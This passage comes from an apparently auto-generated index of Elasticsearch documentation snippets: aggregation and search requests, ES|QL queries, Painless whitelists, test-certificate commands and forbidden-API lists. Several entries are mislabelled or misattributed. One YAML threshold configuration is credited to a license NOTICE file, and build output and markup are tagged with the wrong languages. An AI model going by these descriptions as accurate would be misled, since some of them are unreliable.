http://www.apache.org/licenses/LICENSE-2.0\n\n   Unless required by applicable law or agreed to in writing, software\n   distributed under the License is distributed on an \"AS IS\" BASIS,\n   WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n   See the License for the specific language governing permissions and\n   limitations under the License.\n```\n\n----------------------------------------\n\nTITLE: WriteField Operations Class Definition\nDESCRIPTION: Defines methods for manipulating document fields including moving, overwriting, removing, and transforming field values.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/modules/lang-painless/src/main/resources/org/elasticsearch/painless/org.elasticsearch.script.ingest.txt#2025-04-21_snippet_4\n\nLANGUAGE: java\nCODE:\n```\nclass org.elasticsearch.script.field.WriteField {\n    String getName()\n    boolean exists()\n    WriteField move(def)\n    WriteField overwrite(def)\n    void remove()\n    WriteField set(def)\n    WriteField append(def)\n    boolean isEmpty()\n    int size()\n    Iterator iterator()\n    def get(def)\n    def get(int, def)\n    boolean hasValue(Predicate)\n    WriteField transform(Function)\n    WriteField deduplicate()\n    WriteField removeValuesIf(Predicate)\n    WriteField removeValue(int)\n    NestedDocument doc()\n    NestedDocument doc(int)\n    Iterable docs()\n}\n```\n\n----------------------------------------\n\nTITLE: Frequent Item Sets Aggregation with Filter for European Purchases\nDESCRIPTION: Elasticsearch query using async search to find frequent item sets in e-commerce data, focusing on purchases made in Europe by applying a filter.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/aggregations/search-aggregations-bucket-frequent-item-sets-aggregation.md#2025-04-21_snippet_3\n\nLANGUAGE: console\nCODE:\n```\nPOST /kibana_sample_data_ecommerce/_async_search\n{\n  \"size\": 0,\n  \"aggs\": {\n    \"my_agg\": {\n      \"frequent_item_sets\": {\n        \"minimum_set_size\": 3,\n        \"fields\": [\n          { \"field\": \"category.keyword\" },\n          { \"field\": \"geoip.city_name\" }\n        ],\n        \"size\": 3,\n        \"filter\": {\n          \"term\": {\n            \"geoip.continent_name\": \"Europe\"\n          }\n        }\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Creating First CA PEM - ca1 with Elasticsearch Certutil\nDESCRIPTION: This snippet creates the first Certificate Authority (CA) PEM file named 'ca1' using the Elasticsearch certutil command. It specifies a validity of 9999 days and a distinguished name.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/libs/ssl-config/src/test/resources/certs/README.txt#2025-04-21_snippet_0\n\nLANGUAGE: bash\nCODE:\n```\n# 1. Create first CA PEM (\"ca1\")\n\nelasticsearch-certutil ca --pem --out ca1.zip --days 9999 --ca-dn \"CN=Test CA 1\"\nunzip ca1.zip \nmv ca ca1\n```\n\n----------------------------------------\n\nTITLE: Monthly Sales Max Bucket Query in Elasticsearch\nDESCRIPTION: Example query that calculates the maximum total monthly sales using date histogram and sum aggregations with max_bucket pipeline aggregation.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/aggregations/search-aggregations-pipeline-max-bucket-aggregation.md#2025-04-21_snippet_1\n\nLANGUAGE: console\nCODE:\n```\nPOST /sales/_search\n{\n  \"size\": 0,\n  \"aggs\": {\n    \"sales_per_month\": {\n      \"date_histogram\": {\n        \"field\": \"date\",\n        \"calendar_interval\": \"month\"\n      },\n      \"aggs\": {\n        \"sales\": {\n          \"sum\": {\n            \"field\": \"price\"\n          }\n        }\n      }\n    },\n    \"max_monthly_sales\": {\n      \"max_bucket\": {\n        \"buckets_path\": \"sales_per_month>sales\"\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Pivoting with Aliased Columns\nDESCRIPTION: This snippet demonstrates pivoting with the use of aliases for the columns in the resulting table. The query allows users to customize column names in the pivot operation for readability while aggregating average salary data.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/sql/sql-syntax-select.md#2025-04-21_snippet_32\n\nLANGUAGE: sql\nCODE:\n```\nSELECT * FROM (SELECT languages, gender, salary FROM test_emp) PIVOT (AVG(salary) FOR gender IN ('M' AS \"XY\", 'F' \"XX\"));\n```\n\n----------------------------------------\n\nTITLE: Example Notice for Using Output from ODbL Database\nDESCRIPTION: This snippet provides an example of the required notice when publicly using a produced work that contains information from an ODbL-licensed database. It includes placeholders for the database name and hyperlinks to the license text.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/x-pack/plugin/vector-tile/src/test/resources/org/elasticsearch/xpack/vectortile/feature/LICENSE.txt#2025-04-21_snippet_0\n\nLANGUAGE: markdown\nCODE:\n```\nContains information from DATABASE NAME, which is made available\\n        here under the Open Database License (ODbL).\n```\n\n----------------------------------------\n\nTITLE: Indexing and Querying IP Addresses in Elasticsearch\nDESCRIPTION: This snippet demonstrates how to create an index with an IP field, index a document with an IP address, and perform a search query using CIDR notation.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/mapping-reference/ip.md#2025-04-21_snippet_0\n\nLANGUAGE: console\nCODE:\n```\nPUT my-index-000001\n{\n  \"mappings\": {\n    \"properties\": {\n      \"ip_addr\": {\n        \"type\": \"ip\"\n      }\n    }\n  }\n}\n\nPUT my-index-000001/_doc/1\n{\n  \"ip_addr\": \"192.168.1.1\"\n}\n\nGET my-index-000001/_search\n{\n  \"query\": {\n    \"term\": {\n      \"ip_addr\": \"192.168.0.0/16\"\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Defining ESQL Date Parsing Function\nDESCRIPTION: This snippet defines the description of an ESQL function that parses dates using a specified format. It outlines the function's purpose of returning a date by parsing the second argument according to the format provided in the first argument.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/functions/description/date_parse.md#2025-04-21_snippet_0\n\nLANGUAGE: sql\nCODE:\n```\n% This is generated by ESQL's AbstractFunctionTestCase. Do no edit it. See ../README.md for how to regenerate it.\n\n**Description**\n\nReturns a date by parsing the second argument using the format specified in the first argument.\n```\n\n----------------------------------------\n\nTITLE: Using Index Boost with Specific Indices in Elasticsearch\nDESCRIPTION: This example demonstrates how to use the indices_boost parameter to boost search results from specific indices. It applies a boost of 1.4 to my-index-000001 and 1.3 to my-index-000002.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/rest-apis/search-multiple-data-streams-indices.md#2025-04-21_snippet_4\n\nLANGUAGE: console\nCODE:\n```\nGET /_search\n{\n  \"indices_boost\": [\n    { \"my-index-000001\": 1.4 },\n    { \"my-index-000002\": 1.3 }\n  ]\n}\n```\n\n----------------------------------------\n\nTITLE: Defining Supported Types for Geometric Function in ESQL\nDESCRIPTION: This markdown table specifies the supported input and output types for a geometric function in ESQL. It shows that the function can operate on cartesian points and geo points, returning a double value in both cases.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/functions/types/st_distance.md#2025-04-21_snippet_0\n\nLANGUAGE: markdown\nCODE:\n```\n| geomA | geomB | result |\n| --- | --- | --- |\n| cartesian_point | cartesian_point | double |\n| geo_point | geo_point | double |\n```\n\n----------------------------------------\n\nTITLE: Formatting Dates with DATE_FORMAT in ESQL\nDESCRIPTION: Shows how to select specific columns using KEEP and create a formatted date string using DATE_FORMAT function. The query selects first_name, last_name, and hire_date fields, then creates a new 'hired' field with formatted date.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/functions/examples/date_format.md#2025-04-21_snippet_0\n\nLANGUAGE: esql\nCODE:\n```\nFROM employees\n| KEEP first_name, last_name, hire_date\n| EVAL hired = DATE_FORMAT(\"yyyy-MM-dd\", hire_date)\n```\n\n----------------------------------------\n\nTITLE: Repurposing Node as Dedicated Master\nDESCRIPTION: Example of converting a data node to a dedicated master node using the elasticsearch-node repurpose command. Shows the interactive process of cleaning up shard data after changing node.roles to [\"master\"].\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/command-line-tools/node-tool.md#2025-04-21_snippet_3\n\nLANGUAGE: txt\nCODE:\n```\nnode$ ./bin/elasticsearch-node repurpose\n\n    WARNING: Elasticsearch MUST be stopped before running this tool.\n\nFound 2 shards in 2 indices to clean up\nUse -v to see list of paths and indices affected\nNode is being re-purposed as master and no-data. Clean-up of shard data will be performed.\nDo you want to proceed?\nConfirm [y/N] y\nNode successfully repurposed to master and no-data.\n```\n\n----------------------------------------\n\nTITLE: Auto Date Histogram with Minimum Interval Parameter in Elasticsearch\nDESCRIPTION: Example of an auto date histogram aggregation with a minimum interval parameter. This specifies that the aggregation should not attempt to round at any interval lower than 'minute', which can improve efficiency.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/aggregations/search-aggregations-bucket-autodatehistogram-aggregation.md#2025-04-21_snippet_3\n\nLANGUAGE: console\nCODE:\n```\nPOST /sales/_search?size=0\n{\n  \"aggs\": {\n    \"sale_date\": {\n      \"auto_date_histogram\": {\n        \"field\": \"date\",\n        \"buckets\": 10,\n        \"minimum_interval\": \"minute\"\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Configuring Test Transforms in Gradle for Elasticsearch Compatibility Tests\nDESCRIPTION: Example showing how to mute or skip compatibility tests using test transforms in Gradle. Demonstrates two methods: skipping tests by file pattern and skipping individual tests by name.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/REST_API_COMPATIBILITY.md#2025-04-21_snippet_10\n\nLANGUAGE: groovy\nCODE:\n```\ntasks.named(\"yamlRestCompatTestTransform\").configure({ task ->\n  task.skipTestsByFilePattern(\"**/cat*/*.yml\", \"Cat API are not supported\")\n  task.skipTest(\"bulk/10_basic/Array of objects\", \"Muted due failures. See #12345\")\n})\n```\n\n----------------------------------------\n\nTITLE: Filtering Data with IS NULL in ESQL\nDESCRIPTION: This snippet demonstrates how to use the IS NULL operator in an ESQL query to filter records where the birth_date field is null. It selects data from the employees table and returns only the rows where birth_date does not exist or has a null value.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/kibana/docs/operators/is_null.md#2025-04-21_snippet_0\n\nLANGUAGE: esql\nCODE:\n```\nFROM employees\n| WHERE birth_date IS NULL\n```\n\n----------------------------------------\n\nTITLE: Whitelist AggregationScript class for Painless\nDESCRIPTION: This snippet whitelists the AggregationScript class from the org.elasticsearch.script package for use in Painless scripts. The @no_import annotation prevents direct importing of the class in the script, but allows its members to be accessed if they are also whitelisted.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/modules/lang-painless/src/main/resources/org/elasticsearch/painless/org.elasticsearch.script.aggs.txt#2025-04-21_snippet_0\n\nLANGUAGE: Painless\nCODE:\n```\nclass org.elasticsearch.script.AggregationScript @no_import {\n}\n```\n\n----------------------------------------\n\nTITLE: RST Documentation Structure for MD5 Function\nDESCRIPTION: ReStructuredText (RST) markup defining the documentation structure for the MD5 function in ESQL, including image embedding and content includes for various documentation sections.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/functions/layout/md5.md#2025-04-21_snippet_0\n\nLANGUAGE: restructuredtext\nCODE:\n```\n% This is generated by ESQL's AbstractFunctionTestCase. Do no edit it. See ../README.md for how to regenerate it.\n\n## `MD5` [esql-md5]\n\n**Syntax**\n\n:::{image} ../../../images/functions/md5.svg\n:alt: Embedded\n:class: text-center\n:::\n\n\n:::{include} ../parameters/md5.md\n:::\n\n:::{include} ../description/md5.md\n:::\n\n:::{include} ../types/md5.md\n:::\n\n:::{include} ../examples/md5.md\n:::\n```\n\n----------------------------------------\n\nTITLE: Displaying Supported Types Table in Markdown\nDESCRIPTION: This snippet presents a markdown table showing the supported field types and their corresponding result types for an ESQL function test case. All field types result in a boolean output.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/operators/types/is_not_null.md#2025-04-21_snippet_0\n\nLANGUAGE: markdown\nCODE:\n```\n| field | result |\n| --- | --- |\n| boolean | boolean |\n| cartesian_point | boolean |\n| cartesian_shape | boolean |\n| date | boolean |\n| date_nanos | boolean |\n| double | boolean |\n| geo_point | boolean |\n| geo_shape | boolean |\n| integer | boolean |\n| ip | boolean |\n| keyword | boolean |\n| long | boolean |\n| text | boolean |\n| unsigned_long | boolean |\n| version | boolean |\n```\n\n----------------------------------------\n\nTITLE: Generate Client Keystore with Keytool\nDESCRIPTION: Creates a JKS keystore for the client with RSA key and SAN extensions for localhost variants\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/build-tools-internal/src/main/resources/test/ssl/README.md#2025-04-21_snippet_1\n\nLANGUAGE: bash\nCODE:\n```\nkeytool -genkey -alias test-client -keystore test-client.jks -keyalg RSA -keysize 2048 -validity 3654 -dname CN=\"Elasticsearch Build Test Infrastructure\" -keypass keypass -storepass keypass -ext san=dns:localhost,dns:localhost.localdomain,dns:localhost4,dns:localhost4.localdomain4,dns:localhost6,dns:localhost6.localdomain6,ip:127.0.0.1,ip:0:0:0:0:0:0:0:1\n```\n\n----------------------------------------\n\nTITLE: Expanding Array Values with MV_EXPAND in ESQL\nDESCRIPTION: Demonstrates the use of MV_EXPAND function to expand the array 'a' into separate rows while keeping other column values constant. The query expands [1,2,3] into three separate rows while maintaining the values of columns 'b' and 'j'.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/commands/examples/mv_expand.csv-spec/simple.md#2025-04-21_snippet_0\n\nLANGUAGE: esql\nCODE:\n```\nROW a=[1,2,3], b=\"b\", j=[\"a\",\"b\"]\n| MV_EXPAND a\n```\n\n----------------------------------------\n\nTITLE: Date Range Aggregation with Time Zone in Elasticsearch\nDESCRIPTION: Demonstrates how to perform a date range aggregation with time zone conversion in Elasticsearch. The query uses the CET time zone and includes date math expressions for range boundaries.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/aggregations/search-aggregations-bucket-daterange-aggregation.md#2025-04-21_snippet_3\n\nLANGUAGE: console\nCODE:\n```\nPOST /sales/_search?size=0\n{\n   \"aggs\": {\n       \"range\": {\n           \"date_range\": {\n               \"field\": \"date\",\n               \"time_zone\": \"CET\",\n               \"ranges\": [\n                  { \"to\": \"2016/02/01\" },\n                  { \"from\": \"2016/02/01\", \"to\" : \"now/d\" },\n                  { \"from\": \"now/d\" }\n              ]\n          }\n      }\n   }\n}\n```\n\n----------------------------------------\n\nTITLE: Enabling Slow Logging for Search Requests in Elasticsearch\nDESCRIPTION: This snippet demonstrates how to enable slow logging for search requests using the update indices settings API. It sets the warn threshold to 30 seconds for both fetch and query operations.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/index-settings/slow-log.md#2025-04-21_snippet_6\n\nLANGUAGE: json\nCODE:\n```\nPUT /*/_settings\n{\n  \"index.search.slowlog.include.user\": true,\n  \"index.search.slowlog.threshold.fetch.warn\": \"30s\",\n  \"index.search.slowlog.threshold.query.warn\": \"30s\"\n}\n```\n\n----------------------------------------\n\nTITLE: Deleting an Extension using cURL in Shell\nDESCRIPTION: This shell command demonstrates how to delete an extension using the Elastic Cloud API. It sends a DELETE request to the specific extension ID endpoint with the necessary authentication headers.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch-plugins/cloud/ec-plugins-guide.md#2025-04-21_snippet_19\n\nLANGUAGE: sh\nCODE:\n```\ncurl -X DELETE \\\n  https://api.elastic-cloud.com/api/v1/deployments/extensions/EXTENSION_ID \\\n  -H \"Authorization: ApiKey $CLOUD_API_KEY\" \\\n  -H 'Content-Type: application/json'\n```\n\n----------------------------------------\n\nTITLE: Configuring ElasticSearch Thresholds in YAML\nDESCRIPTION: This YAML configuration defines various thresholds for ElasticSearch operations. It includes settings for search, indexing, and system-wide parameters such as maximum shards per node and cluster concurrent rebalance.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/plugins/discovery-gce/licenses/grpc-context-NOTICE.txt#2025-04-22_snippet_0\n\nLANGUAGE: yaml\nCODE:\n```\n# Increase from 1000 to 10_000\nsearch.max_buckets: 10000\n\n# Increase from 65,536 to 200,000\nindex.max_result_window: 200000\n\n# Increase from 10,000 to 50,000\ncluster.max_shards_per_node: 50000\n\n# Increase from 2 to 4\ncluster.routing.allocation.cluster_concurrent_rebalance: 4\n```\n\n----------------------------------------\n\nTITLE: Defining StringIndexOutOfBoundsException in Java\nDESCRIPTION: This snippet defines the java.lang.StringIndexOutOfBoundsException class, thrown by `String` methods to indicate that an index is either negative or greater than the size of the string. It includes a default constructor and a constructor that accepts a string message.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/modules/lang-painless/src/main/resources/org/elasticsearch/painless/java.lang.txt#2025-04-21_snippet_49\n\nLANGUAGE: java\nCODE:\n```\nclass java.lang.StringIndexOutOfBoundsException {\n  ()\n  (String)\n}\n```\n\n----------------------------------------\n\nTITLE: Analyzing text with dictionary decompounder filter in Elasticsearch\nDESCRIPTION: This example demonstrates how to use the dictionary_decompounder filter in an analyze API request to find subwords in 'Donaudampfschiff' using a specified word list.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/text-analysis/analysis-dict-decomp-tokenfilter.md#2025-04-21_snippet_0\n\nLANGUAGE: console\nCODE:\n```\nGET _analyze\n{\n  \"tokenizer\": \"standard\",\n  \"filter\": [\n    {\n      \"type\": \"dictionary_decompounder\",\n      \"word_list\": [\"Donau\", \"dampf\", \"meer\", \"schiff\"]\n    }\n  ],\n  \"text\": \"Donaudampfschiff\"\n}\n```\n\n----------------------------------------\n\nTITLE: Apache License 2.0 Boilerplate Notice Template\nDESCRIPTION: Standard template for applying Apache License 2.0 to software projects. Developers should replace bracketed fields with their own information.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/modules/ingest-attachment/licenses/poi-scratchpad-LICENSE.txt#2025-04-21_snippet_0\n\nLANGUAGE: text\nCODE:\n```\nCopyright [yyyy] [name of copyright owner]\n\nLicensed under the Apache License, Version 2.0 (the \"License\");\nyou may not use this file except in compliance with the License.\nYou may obtain a copy of the License at\n\n    http://www.apache.org/licenses/LICENSE-2.0\n\nUnless required by applicable law or agreed to in writing, software\ndistributed under the License is distributed on an \"AS IS\" BASIS,\nWITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\nSee the License for the specific language governing permissions and\nlimitations under the License.\n```\n\n----------------------------------------\n\nTITLE: Defining Runtime Field with Painless Script in Elasticsearch\nDESCRIPTION: This snippet demonstrates how to define a runtime field named 'day_of_week' using a Painless script. The script emits the day of the week as a string based on the 'datetime' field.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/scripting-languages/painless/painless-runtime-fields-context.md#2025-04-21_snippet_0\n\nLANGUAGE: json\nCODE:\n```\nPUT seats/_mapping\n{\n  \"runtime\": {\n    \"day_of_week\": {\n      \"type\": \"keyword\",\n      \"script\": {\n        \"source\": \"emit(doc['datetime'].value.getDayOfWeekEnum().toString())\"\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Using value_type in Terms Aggregation for Type Coercion\nDESCRIPTION: Shows how to use the value_type parameter to handle type mismatches across indices. This example specifically demonstrates coercing an IP address field with a missing value fallback.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/aggregations/search-aggregations-bucket-terms-aggregation.md#2025-04-21_snippet_18\n\nLANGUAGE: console\nCODE:\n```\nGET /_search\n{\n  \"aggs\": {\n    \"ip_addresses\": {\n      \"terms\": {\n        \"field\": \"destination_ip\",\n        \"missing\": \"0.0.0.0\",\n        \"value_type\": \"ip\"\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Calculating Weighted Average Using grade and weight Fields in Elasticsearch\nDESCRIPTION: This snippet demonstrates how to use the weighted_avg aggregation to calculate a weighted average of exam grades using the 'grade' field for values and the 'weight' field for weights.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/aggregations/search-aggregations-metrics-weight-avg-aggregation.md#2025-04-21_snippet_0\n\nLANGUAGE: console\nCODE:\n```\nPOST /exams/_search\n{\n  \"size\": 0,\n  \"aggs\": {\n    \"weighted_grade\": {\n      \"weighted_avg\": {\n        \"value\": {\n          \"field\": \"grade\"\n        },\n        \"weight\": {\n          \"field\": \"weight\"\n        }\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Setting Initial Primary Recoveries in Elasticsearch YAML\nDESCRIPTION: This YAML snippet shows the cluster.routing.allocation.node_initial_primaries_recoveries setting, which controls the number of initial primary shard recoveries allowed to happen in parallel on each node.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/configuration-reference/cluster-level-shard-allocation-routing-settings.md#2025-04-21_snippet_3\n\nLANGUAGE: yaml\nCODE:\n```\ncluster.routing.allocation.node_initial_primaries_recoveries\n```\n\n----------------------------------------\n\nTITLE: Displaying Supported Numeric Types Table in Markdown\nDESCRIPTION: This markdown snippet presents a table showing the supported numeric input types and their corresponding result types for an ESQL function. It includes double, integer, long, and unsigned_long as input types, all resulting in double.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/functions/types/atan.md#2025-04-21_snippet_0\n\nLANGUAGE: markdown\nCODE:\n```\n| number | result |\n| --- | --- |\n| double | double |\n| integer | double |\n| long | double |\n| unsigned_long | double |\n```\n\n----------------------------------------\n\nTITLE: Converting WKT to Cartesian Points using TO_CARTESIANPOINT in ESQL\nDESCRIPTION: This ESQL query demonstrates the conversion of WKT point representations to Cartesian points. It uses MV_EXPAND to process multiple WKT strings and then applies the TO_CARTESIANPOINT function to create cartesian_point values.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/functions/examples/to_cartesianpoint.md#2025-04-21_snippet_0\n\nLANGUAGE: esql\nCODE:\n```\nROW wkt = [\"POINT(4297.11 -1475.53)\", \"POINT(7580.93 2272.77)\"]\n| MV_EXPAND wkt\n| EVAL pt = TO_CARTESIANPOINT(wkt)\n```\n\n----------------------------------------\n\nTITLE: Time Zone Operation Restrictions\nDESCRIPTION: Restricts operations that may produce ambiguous or invalid times when working with time zones. Recommends using ZoneRules#getValidOffsets() for proper time zone handling.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/build-tools-internal/src/main/resources/forbidden/es-server-signatures.txt#2025-04-21_snippet_3\n\nLANGUAGE: java\nCODE:\n```\njava.time.LocalDateTime#atZone(java.time.ZoneId)\njava.time.ZonedDateTime#of(int, int, int, int, int, int, int, java.time.ZoneId)\njava.time.ZonedDateTime#of(java.time.LocalDate, java.time.LocalTime, java.time.ZoneId)\njava.time.ZonedDateTime#of(java.time.LocalDateTime, java.time.ZoneId)\n```\n\n----------------------------------------\n\nTITLE: Evaluating Watcher Plugin Projects (File: build.gradle)\nDESCRIPTION: This snippet manages the evaluation of various QA scenarios for the Watcher plugin, including common, REST, and configurations with security in place, ensuring each project's build file is correctly utilized.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/libs/simdvec/output.txt#2025-04-21_snippet_11\n\nLANGUAGE: groovy\nCODE:\n```\n> Configure project :x-pack:plugin:watcher:qa:common\nEvaluating project ':x-pack:plugin:watcher:qa:common' using build file '/Users/rene/dev/elastic/elasticsearch/x-pack/plugin/watcher/qa/common/build.gradle'.\n```\n\nLANGUAGE: groovy\nCODE:\n```\n> Configure project :x-pack:plugin:watcher:qa:rest\nEvaluating project ':x-pack:plugin:watcher:qa:rest' using build file '/Users/rene/dev/elastic/elasticsearch/x-pack/plugin/watcher/qa/rest/build.gradle'.\n```\n\nLANGUAGE: groovy\nCODE:\n```\n> Configure project :x-pack:plugin:watcher:qa:with-security\nEvaluating project ':x-pack:plugin:watcher:qa:with-security' using build file '/Users/rene/dev/elastic/elasticsearch/x-pack/plugin/watcher/qa/with-security/build.gradle'.\n```\n\n----------------------------------------\n\nTITLE: Truncating IPv4 and IPv6 Addresses Using IP_PREFIX in Elasticsearch SQL\nDESCRIPTION: This snippet demonstrates the usage of the IP_PREFIX function to truncate IPv4 and IPv6 addresses. It creates a row with both IP types and applies IP_PREFIX with different prefix lengths.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/kibana/docs/functions/ip_prefix.md#2025-04-21_snippet_0\n\nLANGUAGE: esql\nCODE:\n```\nROW ip4 = to_ip(\"1.2.3.4\"), ip6 = TO_IP(\"fe80::cae2:65ff:fece:feb9\")\n| EVAL ip4_prefix = IP_PREFIX(ip4, 24, 0), ip6_prefix = IP_PREFIX(ip6, 0, 112);\n```\n\n----------------------------------------\n\nTITLE: Elasticsearch Aggregation Timing Breakdown\nDESCRIPTION: This snippet illustrates the detailed timing breakdown for an Elasticsearch aggregation. It shows various execution phases like build_aggregation, initialize, collect, and build_leaf_collector, along with their respective counts and durations in nanoseconds.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/rest-apis/search-profile.md#2025-04-21_snippet_10\n\nLANGUAGE: js\nCODE:\n```\n\"breakdown\": {\n  \"reduce\": 0,\n  \"build_aggregation\": 30885,\n  \"build_aggregation_count\": 1,\n  \"initialize\": 2623,\n  \"initialize_count\": 1,\n  \"reduce_count\": 0,\n  \"collect\": 45786,\n  \"collect_count\": 4,\n  \"build_leaf_collector\": 18211,\n  \"build_leaf_collector_count\": 1\n}\n```\n\n----------------------------------------\n\nTITLE: Normalization of Range Bounds in Synthetic Source\nDESCRIPTION: This snippet demonstrates how range bounds are normalized to inclusive ranges in synthetic source, adjusting the bounds accordingly for exclusive ranges.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/mapping-reference/range.md#2025-04-22_snippet_8\n\nLANGUAGE: console\nCODE:\n```\nPUT idx\n{\n  \"settings\": {\n    \"index\": {\n      \"mapping\": {\n        \"source\": {\n          \"mode\": \"synthetic\"\n        }\n      }\n    }\n  },\n  \"mappings\": {\n    \"properties\": {\n      \"my_range\": { \"type\": \"long_range\" }\n    }\n  }\n}\n\nPUT idx/_doc/1\n{\n  \"my_range\": {\n    \"gt\": 200,\n    \"lt\": 300\n  }\n}\n```\n\nLANGUAGE: console-result\nCODE:\n```\n{\n  \"my_range\": {\n    \"gte\": 201,\n    \"lte\": 299\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Using REPLACE Function in ESQL for String Substitution\nDESCRIPTION: This example demonstrates how to use the REPLACE function in ESQL to substitute one string with another. It creates a row with a string field, replaces 'World' with 'Universe', and then keeps only the modified string field in the result.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/functions/examples/replace.md#2025-04-21_snippet_0\n\nLANGUAGE: esql\nCODE:\n```\nROW str = \"Hello World\"\n| EVAL str = REPLACE(str, \"World\", \"Universe\")\n| KEEP str\n```\n\n----------------------------------------\n\nTITLE: Precision Metric Evaluation Request\nDESCRIPTION: Shows how to use the precision@k metric for evaluating search results quality.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/rest-apis/search-rank-eval.md#2025-04-21_snippet_4\n\nLANGUAGE: console\nCODE:\n```\nGET /my-index-000001/_rank_eval\n{\n  \"requests\": [\n    {\n      \"id\": \"JFK query\",\n      \"request\": { \"query\": { \"match_all\": {} } },\n      \"ratings\": []\n    } ],\n  \"metric\": {\n    \"precision\": {\n      \"k\": 20,\n      \"relevant_rating_threshold\": 1,\n      \"ignore_unlabeled\": false\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Searching bit vectors with KNN query in Elasticsearch\nDESCRIPTION: Performs a k-nearest neighbors search on bit vectors using the knn query. The query searches for documents with vectors similar to the provided query_vector using hamming distance for bit vector comparison.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/mapping-reference/dense-vector.md#_snippet_8\n\nLANGUAGE: console\nCODE:\n```\nPOST /my-bit-vectors/_search?filter_path=hits.hits\n{\n  \"query\": {\n    \"knn\": {\n      \"query_vector\": [127, -127, 0, 1, 42],\n      \"field\": \"my_vector\"\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Preventing Explicit Thread Stopping\nDESCRIPTION: Discourages the use of Thread.stop() which can lead to inconsistent states, recommending interrupt() instead.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/build-tools-internal/src/main/resources/forbidden/jdk-signatures.txt#2025-04-21_snippet_13\n\nLANGUAGE: plaintext\nCODE:\n```\n@defaultMessage Stopping threads explicitly leads to inconsistent states. Use interrupt() instead.\njava.lang.Thread#stop()\n# uncomment when https://github.com/elastic/elasticsearch/issues/31715 is fixed\n# java.lang.Thread#stop(java.lang.Throwable)\n```\n\n----------------------------------------\n\nTITLE: Commenting ESQL AbstractFunctionTestCase Generated Test File\nDESCRIPTION: This code snippet is a LaTeX comment that explains the origin and purpose of the file. It indicates that the content is automatically generated by ESQL's AbstractFunctionTestCase and should not be manually edited. It also provides a reference to a README file for regeneration instructions.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/functions/description/mv_append.md#2025-04-21_snippet_0\n\nLANGUAGE: tex\nCODE:\n```\n% This is generated by ESQL's AbstractFunctionTestCase. Do no edit it. See ../README.md for how to regenerate it.\n```\n\n----------------------------------------\n\nTITLE: Between Function - Elasticsearch Query\nDESCRIPTION: Filters processes by checking if the substring between characters 's' and 'e' in `process_name` matches 'yst'. Uses a custom script to perform the string slice and comparison.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/x-pack/plugin/eql/src/test/resources/querytranslator_tests.txt#2025-04-21_snippet_14\n\nLANGUAGE: Elasticsearch 